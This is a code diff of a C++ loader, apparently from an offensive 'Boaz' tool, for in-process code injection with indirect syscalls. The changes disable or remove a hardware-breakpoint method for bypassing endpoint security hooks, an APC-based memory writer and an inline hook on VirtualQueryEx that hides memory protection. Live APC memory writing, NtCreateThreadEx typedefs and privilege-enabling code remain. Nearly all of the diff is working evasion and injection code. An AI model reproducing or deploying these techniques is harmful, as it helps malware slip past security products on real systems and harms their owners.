@@ -5,12 +5,17 @@
  * Local inejction only 
  * Add indirect syscall with Halo's gate method to replace NT functions used. 
  * Author: Thomas X Meng
+# Date 2023
+#
+# This file is part of the Boaz tool
+# Copyright (c) 2019-2024 Thomas M
+# Licensed under the GPLv3 or later.
  * 
 */
 #include <windows.h>
-#include <winternl.h> // For NTSTATUS definitions
+#include <winternl.h> 
 #include <psapi.h>
-#include <stdlib.h> // For ExitProcess
+#include <stdlib.h> 
 #include <tlhelp32.h>
 #include <stdio.h>
 #include <ctype.h>
@@ -30,78 +35,15 @@ typedef BOOL     (__stdcall *DLLEntry)(HINSTANCE dll, unsigned long reason, void
 // Standalone function to delay execution using WaitForSingleObjectEx
 void SimpleSleep(DWORD dwMilliseconds)
 {
-    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Create an unsignaled event
+    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); 
     if (hEvent != NULL)
     {
-        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE); // Wait for the specified duration
-        CloseHandle(hEvent); // Clean up the event object
+        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE);
+        CloseHandle(hEvent); 
     }
 }
 
-// #define UNICODE
-// #define _UNICODE
-// #include <windows.h>
-// #include <shlwapi.h>
-// // Ensure to link with Shlwapi.lib
-// #pragma comment(lib, "shlwapi.lib")
 
-// Function to remove the filename from a path, leaving only the directory path
-void RemoveFileName(wchar_t* path) {
-    size_t len = wcslen(path);
-    while (len > 0) {
-        if (path[len - 1] == L'\\' || path[len - 1] == L'/') {
-            path[len] = L'\0'; // Null terminate at the last slash
-            break;
-        }
-        len--;
-    }
-}
-
-// Function to write memory content to a file
-BOOL WriteMemoryToFile(const wchar_t* fileName, PVOID memoryPtr, SIZE_T memorySize) {
-    HANDLE hFile;
-    DWORD written;
-
-    // Open the file
-    hFile = CreateFileW(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        wprintf(L"Failed to create file %s. Error: %lu\n", fileName, GetLastError());
-        return FALSE;
-    }
-
-    // Write the memory content to the file
-    BOOL result = WriteFile(hFile, memoryPtr, (DWORD)memorySize, &written, NULL);
-    CloseHandle(hFile);
-
-    if (!result) {
-        wprintf(L"Failed to write to file. Error: %lu\n", GetLastError());
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-
-void ConvertToDoubleBackslashes(const wchar_t* src, wchar_t* dest, size_t destSize) {
-    size_t srcLen = wcslen(src);
-    size_t destIdx = 0;
-
-    for (size_t srcIdx = 0; srcIdx < srcLen && destIdx < destSize - 1; ++srcIdx) {
-        if (src[srcIdx] == L'\\') {
-            if (destIdx < destSize - 2) {
-                dest[destIdx++] = L'\\';
-                dest[destIdx++] = L'\\';
-            } else {
-                break; // Not enough space to add double backslashes
-            }
-        } else {
-            dest[destIdx++] = src[srcIdx];
-        }
-    }
-    dest[destIdx] = L'\0';
-} 
-
-// Define LDR_DATA_TABLE_ENTRY
 typedef struct _LDR_DATA_TABLE_ENTRY_FREE {
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
@@ -174,186 +116,163 @@ typedef struct _LDR_DATA_TABLE_ENTRY_FREE {
 //     return FALSE;
 // }
 
-
-// BOOL ChangeMemoryProtectionToNoAccess(const MEMORY_BASIC_INFORMATION* Mbi) {
-//     DWORD oldProtect;
-//     BOOL result = VirtualProtect(Mbi->BaseAddress, Mbi->RegionSize, PAGE_NOACCESS, &oldProtect);
-//     if (result == FALSE) {
-//         // Handle error. Use GetLastError() to get more details.
-//         printf("Error changing memory protection to PAGE_NOACCESS. Error: %lu\n", GetLastError());
-//     }
-//     return result;
-// }
 /////////////////////////// Breakpoint test, TODO: 
 
-BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle);
+// BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle);
 
-typedef struct {
-    unsigned int  dr0_local : 1;
-    unsigned int  dr0_global : 1;
-    unsigned int  dr1_local : 1;
-    unsigned int  dr1_global : 1;
-    unsigned int  dr2_local : 1;
-    unsigned int  dr2_global : 1;
-    unsigned int  dr3_local : 1;
-    unsigned int  dr3_global : 1;
-    unsigned int  local_enabled : 1;
-    unsigned int  global_enabled : 1;
-    unsigned int  reserved_10 : 1;
-    unsigned int  rtm : 1;
-    unsigned int  reserved_12 : 1;
-    unsigned int  gd : 1;
-    unsigned int  reserved_14_15 : 2;
-    unsigned int  dr0_break : 2;
-    unsigned int  dr0_len : 2;
-    unsigned int  dr1_break : 2;
-    unsigned int  dr1_len : 2;
-    unsigned int  dr2_break : 2;
-    unsigned int  dr2_len : 2;
-    unsigned int  dr3_break : 2;
-    unsigned int  dr3_len : 2;
-} dr7_t;
-
-
-
-// find the address of the syscall and retn instruction within a Nt* function
-BOOL FindSyscallInstruction(LPVOID nt_func_addr, LPVOID* syscall_addr, LPVOID* syscall_ret_addr) {
-    BYTE* ptr = (BYTE*)nt_func_addr;
-
-    // iterate through the native function stub to find the syscall instruction
-    for (int i = 0; i < 1024; i++) {
-
-        // check for syscall opcode (FF 05)
-        if (ptr[i] == 0x0F && ptr[i + 1] == 0x05) {
-            printf("Found syscall opcode at 0x%llx\n", (DWORD64)&ptr[i]);
-            *syscall_addr = (LPVOID)&ptr[i];
-            *syscall_ret_addr = (LPVOID)&ptr[i + 2];
-            break;
-        }
-    }
-
-    // make sure we found the syscall instruction
-    if (!*syscall_addr) {
-        printf("error: syscall instruction not found\n");
-        return FALSE;
-    }
-
-    // make sure the instruction after syscall is retn
-    if (**(BYTE**)syscall_ret_addr != 0xc3) {
-        printf("Error: syscall instruction not followed by ret\n");
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-// set a breakpoint on the syscall and retn instruction of a Nt* function
-BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle) {
-    LPVOID syscall_addr, syscall_ret_addr;
-    CONTEXT thread_context = { 0 };
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-
-    if (!FindSyscallInstruction(nt_func_addr, &syscall_addr, &syscall_ret_addr)) {
-        return FALSE;
-    }
-
-    thread_context.ContextFlags = CONTEXT_FULL;
-
-    // get the current thread context (note, this must be a suspended thread)
-    if (!GetThreadContext(thread_handle, &thread_context)) {
-        printf("GetThreadContext() failed, error: %d\n", GetLastError());
-        return FALSE;
-    }
-
-    dr7_t dr7 = { 0 };
-
-    dr7.dr0_local = 1; // set DR0 as an execute breakpoint
-    dr7.dr1_local = 1; // set DR1 as an execute breakpoint
-
-    thread_context.ContextFlags = CONTEXT_ALL;
-
-    thread_context.Dr0 = (DWORD64)syscall_addr;     // set DR0 to break on syscall address
-    thread_context.Dr1 = (DWORD64)syscall_ret_addr; // set DR1 to break on syscall ret address
-    thread_context.Dr7 = *(DWORD*)&dr7;
-
-    // use SetThreadContext to update the debug registers
-    if (!SetThreadContext(thread_handle, &thread_context)) {
-        printf("SetThreadContext() failed, error: %d\n", GetLastError());
-    }
-
-    printf("Hardware breakpoints set\n");
-    return TRUE;
-}
-
-
-int g_bypass_method = 1;
-HANDLE g_thread_handle = NULL;
-// PCONTEXT g_thread_context = NULL;
-
-typedef NTSTATUS (WINAPI* t_NtSetContextThread)(
-	HANDLE ThreadHandle, PCONTEXT Context
-	);
-
-t_NtSetContextThread NtSetContextThread;
-
-typedef NTSTATUS (WINAPI* t_NtResumeThread)(
-    HANDLE ThreadHandle,
-    PULONG SuspendCount
-);
-
-t_NtResumeThread NtResumeThread;
-
-// typedef NTSTATUS (NTAPI *t_NtCreateThreadEx)(
-//     PHANDLE hThread,
-//     ACCESS_MASK DesiredAccess,
-//     PVOID ObjectAttributes,
-//     HANDLE ProcessHandle,
-//     PVOID lpStartAddress,
-//     PVOID lpParameter,
-//     ULONG Flags,
-//     SIZE_T StackZeroBits,
-//     SIZE_T SizeOfStackCommit,
-//     SIZE_T SizeOfStackReserve,
-//     PVOID lpBytesBuffer);
-
-// t_NtCreateThreadEx NtCreateThreadEx;
-
-// dynamically resolve the required ntdll functions
-BOOL ResolveNativeApis()
-{
-	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-	if (!ntdll)
-		return FALSE;
-
-	NtSetContextThread = (t_NtSetContextThread)GetProcAddress(ntdll, "NtSetContextThread");
-	if (!NtSetContextThread)
-		return FALSE;
-
-    NtResumeThread = (t_NtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
-    if (!NtResumeThread)
-        return FALSE;
-
-    // NtCreateThreadEx = (t_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
-
-	return TRUE;
-}
+// typedef struct {
+//     unsigned int  dr0_local : 1;
+//     unsigned int  dr0_global : 1;
+//     unsigned int  dr1_local : 1;
+//     unsigned int  dr1_global : 1;
+//     unsigned int  dr2_local : 1;
+//     unsigned int  dr2_global : 1;
+//     unsigned int  dr3_local : 1;
+//     unsigned int  dr3_global : 1;
+//     unsigned int  local_enabled : 1;
+//     unsigned int  global_enabled : 1;
+//     unsigned int  reserved_10 : 1;
+//     unsigned int  rtm : 1;
+//     unsigned int  reserved_12 : 1;
+//     unsigned int  gd : 1;
+//     unsigned int  reserved_14_15 : 2;
+//     unsigned int  dr0_break : 2;
+//     unsigned int  dr0_len : 2;
+//     unsigned int  dr1_break : 2;
+//     unsigned int  dr1_len : 2;
+//     unsigned int  dr2_break : 2;
+//     unsigned int  dr2_len : 2;
+//     unsigned int  dr3_break : 2;
+//     unsigned int  dr3_len : 2;
+// } dr7_t;
 
 
 
-// a separate thread for calling SetResumeThread so we can set hardware breakpoints
-//This function can be any function you would like to use as decoy to cause the exception.
-DWORD SetResumeThread(LPVOID param) {
+// // find the address of the syscall and retn instruction within a Nt* function
+// BOOL FindSyscallInstruction(LPVOID nt_func_addr, LPVOID* syscall_addr, LPVOID* syscall_ret_addr) {
+//     BYTE* ptr = (BYTE*)nt_func_addr;
 
-    HANDLE hThreadd = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)0x7FF7A2A7, NULL, CREATE_SUSPENDED, NULL);
-	// call NtSetContextThread with fake parameters (can be anything but we chose NULL)
-	NTSTATUS status = NtResumeThread(hThreadd, NULL);
-	if (!NT_SUCCESS(status)) {
-		printf("NtResumeThread failed, error: %x\n", status);
-		return -1;
-	}
+//     // iterate through the native function stub to find the syscall instruction
+//     for (int i = 0; i < 1024; i++) {
 
-	return 0;
-}
+//         // check for syscall opcode (FF 05)
+//         if (ptr[i] == 0x0F && ptr[i + 1] == 0x05) {
+//             printf("Found syscall opcode at 0x%llx\n", (DWORD64)&ptr[i]);
+//             *syscall_addr = (LPVOID)&ptr[i];
+//             *syscall_ret_addr = (LPVOID)&ptr[i + 2];
+//             break;
+//         }
+//     }
+
+//     
+//     if (!*syscall_addr) {
+//         printf("error: syscall instruction not found\n");
+//         return FALSE;
+//     }
+
+//     // make sure the instruction after syscall is retn
+//     if (**(BYTE**)syscall_ret_addr != 0xc3) {
+//         printf("Error: syscall instruction not followed by ret\n");
+//         return FALSE;
+//     }
+
+//     return TRUE;
+// }
+
+// // set a breakpoint on the syscall and retn instruction of a Nt* function
+// BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle) {
+//     LPVOID syscall_addr, syscall_ret_addr;
+//     CONTEXT thread_context = { 0 };
+//     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+
+//     if (!FindSyscallInstruction(nt_func_addr, &syscall_addr, &syscall_ret_addr)) {
+//         return FALSE;
+//     }
+
+//     thread_context.ContextFlags = CONTEXT_FULL;
+
+//     // get the current thread context (note, this must be a suspended thread)
+//     if (!GetThreadContext(thread_handle, &thread_context)) {
+//         printf("GetThreadContext() failed, error: %d\n", GetLastError());
+//         return FALSE;
+//     }
+
+//     dr7_t dr7 = { 0 };
+
+//     dr7.dr0_local = 1; // set DR0 as an execute breakpoint
+//     dr7.dr1_local = 1; // set DR1 as an execute breakpoint
+
+//     thread_context.ContextFlags = CONTEXT_ALL;
+
+//     thread_context.Dr0 = (DWORD64)syscall_addr;     // set DR0 to break on syscall address
+//     thread_context.Dr1 = (DWORD64)syscall_ret_addr; // set DR1 to break on syscall ret address
+//     thread_context.Dr7 = *(DWORD*)&dr7;
+
+//     // use SetThreadContext to update the debug registers
+//     if (!SetThreadContext(thread_handle, &thread_context)) {
+//         printf("SetThreadContext() failed, error: %d\n", GetLastError());
+//     }
+
+//     printf("Hardware breakpoints set\n");
+//     return TRUE;
+// }
+
+
+// int g_bypass_method = 1;
+// HANDLE g_thread_handle = NULL;
+// // PCONTEXT g_thread_context = NULL;
+
+// typedef NTSTATUS (WINAPI* t_NtSetContextThread)(
+// 	HANDLE ThreadHandle, PCONTEXT Context
+// 	);
+
+// t_NtSetContextThread NtSetContextThread;
+
+// typedef NTSTATUS (WINAPI* t_NtResumeThread)(
+//     HANDLE ThreadHandle,
+//     PULONG SuspendCount
+// );
+
+// t_NtResumeThread NtResumeThread;
+
+
+
+// // dynamically resolve the required ntdll functions
+// BOOL ResolveNativeApis()
+// {
+// 	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+// 	if (!ntdll)
+// 		return FALSE;
+
+// 	NtSetContextThread = (t_NtSetContextThread)GetProcAddress(ntdll, "NtSetContextThread");
+// 	if (!NtSetContextThread)
+// 		return FALSE;
+
+//     NtResumeThread = (t_NtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
+//     if (!NtResumeThread)
+//         return FALSE;
+
+//     // NtCreateThreadEx = (t_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
+
+// 	return TRUE;
+// }
+
+
+
+// // a separate thread for calling SetResumeThread so we can set hardware breakpoints
+// //This function can be any function you would like to use as decoy to cause the exception.
+// DWORD SetResumeThread(LPVOID param) {
+
+//     HANDLE hThreadd = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)0x7FF7A2A7, NULL, CREATE_SUSPENDED, NULL);
+// 	// call NtSetContextThread with fake parameters (can be anything but we chose NULL)
+// 	NTSTATUS status = NtResumeThread(hThreadd, NULL);
+// 	if (!NT_SUCCESS(status)) {
+// 		printf("NtResumeThread failed, error: %x\n", status);
+// 		return -1;
+// 	}
+
+// 	return 0;
+// }
 
 
 
@@ -371,73 +290,73 @@ DWORD SetResumeThread(LPVOID param) {
 // }
 
 
-// exception handler for hardware breakpoints
-LONG WINAPI BreakpointHandler(PEXCEPTION_POINTERS e)
-{
-	// hardware breakpoints trigger a single step exception
-	if (e->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
-		// this exception was caused by DR0 (syscall breakpoint)
-		if (e->ContextRecord->Dr6 & 0x1) {
-			printf("syscall breakpoint triggered at address: 0x%llx\n",
-				   (DWORD64)e->ExceptionRecord->ExceptionAddress);
+// // exception handler for hardware breakpoints
+// LONG WINAPI BreakpointHandler(PEXCEPTION_POINTERS e)
+// {
+// 	// hardware breakpoints trigger a single step exception
+// 	if (e->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
+// 		// this exception was caused by DR0 (syscall breakpoint)
+// 		if (e->ContextRecord->Dr6 & 0x1) {
+// 			printf("syscall breakpoint triggered at address: 0x%llx\n",
+// 				   (DWORD64)e->ExceptionRecord->ExceptionAddress);
 
-			// replace the fake parameters with the real ones
-			e->ContextRecord->Rcx = (DWORD64)g_thread_handle;
-			e->ContextRecord->R10 = (DWORD64)g_thread_handle;
-			// e->ContextRecord->Rdx = NULL;
-			// e->ContextRecord->Rdx = (DWORD64)g_thread_context;
-			/// for CreateThread
-			// e->ContextRecord->Rcx = (DWORD64)NULL;
-			// e->ContextRecord->R10 = (DWORD64)0;
-			// e->ContextRecord->Rdx = (DWORD64)0;
-			// e->ContextRecord->R8 = (LPTHREAD_START_ROUTINE)g_allocBuffer
-		}
+// 			// replace the fake parameters with the real ones
+// 			e->ContextRecord->Rcx = (DWORD64)g_thread_handle;
+// 			e->ContextRecord->R10 = (DWORD64)g_thread_handle;
+// 			// e->ContextRecord->Rdx = NULL;
+// 			// e->ContextRecord->Rdx = (DWORD64)g_thread_context;
+// 			/// for CreateThread
+// 			// e->ContextRecord->Rcx = (DWORD64)NULL;
+// 			// e->ContextRecord->R10 = (DWORD64)0;
+// 			// e->ContextRecord->Rdx = (DWORD64)0;
+// 			// e->ContextRecord->R8 = (LPTHREAD_START_ROUTINE)g_allocBuffer
+// 		}
 
-		// this exception was caused by DR1 (syscall ret breakpoint)
-		if (e->ContextRecord->Dr6 & 0x2) {
-			printf("syscall ret breakpoint triggered at address: 0x%llx\n",
-				   (DWORD64)e->ExceptionRecord->ExceptionAddress);
-            // e->ContextRecord->Rax = 0xC0000156; // STATUS too many secrets.
+// 		// this exception was caused by DR1 (syscall ret breakpoint)
+// 		if (e->ContextRecord->Dr6 & 0x2) {
+// 			printf("syscall ret breakpoint triggered at address: 0x%llx\n",
+// 				   (DWORD64)e->ExceptionRecord->ExceptionAddress);
+//             // e->ContextRecord->Rax = 0xC0000156; // STATUS too many secrets.
 
-			// set the parameters back to fake ones
-			// since x64 uses registers for the first 4 parameters, we don't need to do anything here
-			// for calls with more than 4 parameters, we'd need to modify the stack
-		}
-	}
+// 			// set the parameters back to fake ones
+// 			// since x64 uses registers for the first 4 parameters, we don't need to do anything here
+// 			// for calls with more than 4 parameters, we'd need to modify the stack
+// 		}
+// 	}
 
-	e->ContextRecord->EFlags |= (1 << 16); // set the ResumeFlag to continue execution
+// 	e->ContextRecord->EFlags |= (1 << 16); // set the ResumeFlag to continue execution
 
-	return EXCEPTION_CONTINUE_EXECUTION;
-}
+// 	return EXCEPTION_CONTINUE_EXECUTION;
+// }
 
 
-//Method 1: 
-BOOL BypassHookUsingBreakpoints() {
-	// set an exception handler to handle hardware breakpoints
-	SetUnhandledExceptionFilter(BreakpointHandler);
+// //Method 1: 
+// BOOL BypassHookUsingBreakpoints() {
+// 	// set an exception handler to handle hardware breakpoints
+// 	SetUnhandledExceptionFilter(BreakpointHandler);
 
-	// create a new thread to call SetThreadContext in a suspended state so we can modify its own context
-	HANDLE new_thread = CreateThread(NULL, 0, SetResumeThread,
-									 NULL, CREATE_SUSPENDED, NULL);
-	if (!new_thread) {
-		printf("CreateThread() failed, error: %d\n", GetLastError());
-		return FALSE;
-	} else {
-        printf("CreateThread() success\n");
-    }
+// 	// create a new thread to call SetThreadContext in a suspended state so we can modify its own context
+// 	HANDLE new_thread = CreateThread(NULL, 0, SetResumeThread,
+// 									 NULL, CREATE_SUSPENDED, NULL);
+// 	if (!new_thread) {
+// 		printf("CreateThread() failed, error: %d\n", GetLastError());
+// 		return FALSE;
+// 	} else {
+//         printf("CreateThread() success\n");
+//     }
 
-	// set our hardware breakpoints before and after the syscall in the NtResumeThread stub
-	SetSyscallBreakpoints((LPVOID)NtResumeThread, new_thread);
-    printf("Hardware breakpoints set\n");
-	ResumeThread(new_thread);
+// 	// set our hardware breakpoints before and after the syscall in the NtResumeThread stub
+// 	SetSyscallBreakpoints((LPVOID)NtResumeThread, new_thread);
+//     printf("Hardware breakpoints set\n");
+// 	ResumeThread(new_thread);
 
-	// wait until the SetThreadContext thread has finished before continuing
-	// WaitForSingleObject(new_thread, INFINITE);
+// 	// wait until the SetThreadContext thread has finished before continuing
+// 	// WaitForSingleObject(new_thread, INFINITE);
 
-	return TRUE;
-}
+// 	return TRUE;
+// }
 
-////////////////////////// Breakpoint test: 
+////////////////////////// Breakpoint test end
 
 void ManualInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
     DestinationString->Length = wcslen(SourceString) * sizeof(WCHAR);
@@ -445,20 +364,6 @@ void ManualInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceStr
     DestinationString->Buffer = (PWSTR)SourceString;
 }
 
-// typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
-//     HANDLE ProcessHandle,
-//     PVOID *BaseAddress,
-//     SIZE_T *NumberOfBytesToProtect,
-//     ULONG NewAccessProtection,
-//     PULONG OldAccessProtection);
-
-/////////////////////////// Change state, TODO:  
-
-// typedef enum _PROCESS_STATE_CHANGE_TYPE {
-//     ThreadStateChangeSuspend,
-//     ThreadStateChangeResume,
-//     ProcessStateChangeMax,
-// } PROCESS_STATE_CHANGE_TYPE, *PPROCESS_STATE_CHANGE_TYPE;
 
 typedef enum _THREAD_STATE_CHANGE_TYPE
 {
@@ -507,8 +412,6 @@ typedef NTSTATUS (NTAPI *pNtChangeProcessState)(
 
 #pragma comment(lib, "ntdll")
 using myNtTestAlert = NTSTATUS(NTAPI*)();
-
-///////////////////////////////
 
 /////////////////////////////////// Dynamic loading: 
 #define ADDR unsigned __int64
@@ -1050,96 +953,7 @@ typedef NTSTATUS (NTAPI *NtQueueApcThreadEx2_t)(
 
 typedef ULONG (NTAPI *NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
 
-// // Function to write memory using APCs with an option to choose the thread creation method
-// DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread) {
-//     HANDLE hThread = NULL;
-//     NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueueApcThread");
-//     void *pRtlFillMemory = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlFillMemory");
 
-//     if (!pNtQueueApcThread || !pRtlFillMemory) {
-//         printf("[-] Failed to locate required functions.\n");
-//         return 1;
-//     }
-
-//     if (useRtlCreateUserThread) {
-//         pRtlCreateUserThread RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
-//         if (!RtlCreateUserThread) {
-//             printf("[-] Failed to locate RtlCreateUserThread.\n");
-//             return 1;
-//         }
-
-//         CLIENT_ID ClientID;
-//         NTSTATUS ntStatus = RtlCreateUserThread(
-//             hProcess,
-//             NULL, // SecurityDescriptor
-//             TRUE, // CreateSuspended - not directly supported, handle suspension separately
-//             0, // StackZeroBits
-//             NULL, // StackReserved
-//             NULL, // StackCommit
-//             (PVOID)(ULONG_PTR)ExitThread, // StartAddress, using ExitThread as a placeholder
-//             NULL, // StartParameter
-//             &hThread,
-//             &ClientID);
-
-//         if (ntStatus != STATUS_SUCCESS) {
-//             printf("[-] RtlCreateUserThread failed: %x\n", ntStatus);
-//             return 1;
-//         }
-//         printf("[+] RtlCreateUserThread succeeded\n");
-//         // Immediately suspend the thread to mimic the NT_CREATE_THREAD_EX_SUSPENDED flag behavior
-//         // SuspendThread(hThread);
-//     } else {
-//         NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
-//         if (!pNtCreateThreadEx) {
-//             printf("[-] Failed to locate NtCreateThreadEx.\n");
-//             return 1;
-//         }
-
-//         ULONG status = pNtCreateThreadEx(
-//             &hThread,
-//             NT_CREATE_THREAD_EX_ALL_ACCESS,
-//             NULL,
-//             hProcess,
-//             (PVOID)(ULONG_PTR)ExitThread,
-//             NULL,
-//             NT_CREATE_THREAD_EX_SUSPENDED,
-//             0,
-//             0,
-//             0,
-//             NULL);
-
-//         if (status != 0) {
-//             printf("[-] Failed to create remote thread: %lu\n", status);
-//             return 1;
-//         }
-//         printf("[+] NtCreateThreadEx succeeded\n");
-//     }
-
-//     // Write memory using APCs
-//     for (DWORD i = 0; i < dwLength; i++) {
-//         BYTE byte = pData[i];
-
-//         // Print only for the first and last byte
-//         if (i == 0 || i == dwLength - 1) {
-//             printf("[+] Writing byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
-//         }
-//         ULONG result  = pNtQueueApcThread(hThread, pRtlFillMemory, pAddress + i, (PVOID)1, (PVOID)(ULONG_PTR)byte); 
-//         if (result != STATUS_SUCCESS) {
-//             printf("[-] Failed to queue APC. NTSTATUS: 0x%X\n", result);
-//             TerminateThread(hThread, 0);
-//             CloseHandle(hThread);
-//             return 1;
-//         }
-//     }
-
-//     // Resume the thread to execute queued APCs and then wait for completion
-//     ResumeThread(hThread);
-//     WaitForSingleObject(hThread, INFINITE);
-
-//     printf("[+] APC write completed\n");
-//     CloseHandle(hThread);
-//     return 0;
-// }
 
 // Function to write memory using APCs with an option to choose the thread creation method
 DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread, BOOL bUseCreateThreadpoolWait) {
@@ -1475,84 +1289,7 @@ BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
 
     return ret;
 }
-////////////////Some hooks
-// // Typedef for the original VirtualQueryEx function
-// typedef BOOL (WINAPI *PFNVirtualQueryEx)(
-//     HANDLE hProcess,
-//     PVOID lpAddress,
-//     PMEMORY_BASIC_INFORMATION lpBuffer,
-//     SIZE_T dwLength
-// );
 
-// // Global variable to hold the original function pointer
-// PFNVirtualQueryEx fpOriginalVirtualQueryEx = NULL;
-
-// // Hook function
-// BOOL WINAPI HookedVirtualQueryEx(
-//     HANDLE hProcess,
-//     PVOID lpAddress,
-//     PMEMORY_BASIC_INFORMATION lpBuffer,
-//     SIZE_T dwLength
-// ) {
-//     // Log that the hook was called
-//     printf("HookedVirtualQueryEx called\n");
-
-//     // Call the original VirtualQueryEx function
-//     BOOL result = fpOriginalVirtualQueryEx(hProcess, lpAddress, lpBuffer, dwLength);
-
-//     // Check if the queried process is not the current process
-//     if (result && hProcess != GetCurrentProcess()) {
-//         // Modify Mbi.Protect to return a constant value
-//         lpBuffer->Protect = PAGE_NOACCESS;
-//         printf("VirtualQueryEx called from another process. Returning PAGE_NOACCESS.\n");
-//     }
-
-//     return result;
-// }
-
-// // Function to install the hook
-// void InstallVirtualQueryExHook() {
-//     HMODULE hMod = GetModuleHandle(TEXT("kernel32.dll"));
-//     FARPROC procAddress = GetProcAddress(hMod, "VirtualQueryEx");
-
-//     if (procAddress) {
-//         // Save the original address
-//         fpOriginalVirtualQueryEx = (PFNVirtualQueryEx)procAddress;
-
-//         // Calculate the jump offset from the original function to our custom function
-//         DWORD oldProtect;
-//         if (!VirtualProtect((LPVOID)procAddress, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-//             printf("VirtualProtect failed. Error: %lu\n", GetLastError());
-//             return;
-//         }
-
-//         intptr_t relativeAddress = (intptr_t)HookedVirtualQueryEx - (intptr_t)procAddress - 5;
-//         *(BYTE*)procAddress = 0xE9; // JMP instruction
-//         *(intptr_t*)((BYTE*)procAddress + 1) = relativeAddress;
-
-//         if (!VirtualProtect((LPVOID)procAddress, 5, oldProtect, &oldProtect)) {
-//             printf("VirtualProtect failed to restore. Error: %lu\n", GetLastError());
-//             return;
-//         }
-
-//         printf("Hook installed successfully\n");
-//     } else {
-//         printf("Failed to get address of VirtualQueryEx\n");
-//     }
-// }
-
-// // Test function to verify the hook
-// void TestHook(PVOID testAddress) {
-//     MEMORY_BASIC_INFORMATION mbi;
-//     HANDLE hProcess = GetCurrentProcess();
-
-//     if (VirtualQueryEx(hProcess, testAddress, &mbi, sizeof(mbi))) {
-//         printf("VirtualQueryEx result: BaseAddress=%p, RegionSize=%zu, State=%lu, Protect=0x%x\n",
-//                mbi.BaseAddress, mbi.RegionSize, mbi.State, mbi.Protect);
-//     } else {
-//         printf("VirtualQueryEx failed. Error: %lu\n", GetLastError());
-//     }
-// }
 
 ////////////////////////////////////////
 
@@ -1872,73 +1609,6 @@ int main(int argc, char *argv[])
     printf("[+] Original memory protection was: %s (0x%08X)\n", ProtectionToString(oldProtect), oldProtect);
         
     
-    
-    // // Install the hook
-    // InstallVirtualQueryExHook();
-
-    // // Test the hook
-    // TestHook(baseAddress);
-
-//TODO: Change DLL path in PEB: 
-
-    // printf("[+] Write custom DLL to current directory \n");
-    // wchar_t currentPath_ff[MAX_PATH];
-    // wchar_t currentPath_f[MAX_PATH];
-
-    // // Obtain the current executable's directory
-    // if (!GetModuleFileNameW(NULL, currentPath_ff, MAX_PATH)) {
-    //     wprintf(L"Failed to get current directory. Error: %lu\n", GetLastError());
-    //     return 1;
-    // }
-    // RemoveFileName(currentPath_ff);
-    // ConvertToDoubleBackslashes(currentPath_ff, currentPath_f, sizeof(currentPath_f) / sizeof(currentPath_f[0]));
-
-    // wprintf(L"Directory path: %ls\n", currentPath_f);
-
-    // wchar_t dllName[MAX_PATH];
-    // wchar_t* lastBackslash = wcsrchr(dllPath, L'\\');
-    // if (lastBackslash != NULL) {
-    //     // Move the pointer to the character after the last backslash
-    //     lastBackslash++;
-    //     // Copy the DLL name to dllName
-    //     wcscpy_s(dllName, MAX_PATH, lastBackslash);
-    // } else {
-    //     // If no backslash is found, the path is just the DLL name
-    //     wcscpy_s(dllName, MAX_PATH, dllPath);
-    // }
-    // wprintf(L"Stripped DLL name: %ls\n", dllName);
-
-    // errno_t err = wcsncat_s(currentPath_f, MAX_PATH, dllName, _TRUNCATE);
-    // if (err != 0) {
-    //     wprintf(L"Failed to append DLL name. Error code: %d\n", err);
-    //     return 1;
-    // } else {
-    //     wprintf(L"Current path after appending: %ls\n", currentPath_f);
-    // }
-    
-    // // Call the function to write the memory content to a new file
-    // if (WriteMemoryToFile(currentPath_f, hDll, dllSize)) {
-    //     wprintf(L"Modified DLL saved successfully to %s\n", currentPath_f);
-    // } else {
